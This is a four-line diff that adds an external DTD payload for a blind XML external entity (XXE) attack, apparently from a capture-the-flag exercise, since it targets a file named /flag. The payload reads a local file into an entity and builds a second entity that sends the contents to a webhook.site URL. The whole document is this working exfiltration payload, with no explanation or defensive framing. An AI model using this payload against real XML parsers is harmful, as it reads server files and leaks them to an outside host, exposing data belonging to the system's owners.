@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/23fa1e48-4e91-4643-9a47-5dcba6a39976/?c=%file;'>">
+%eval;
+%send;
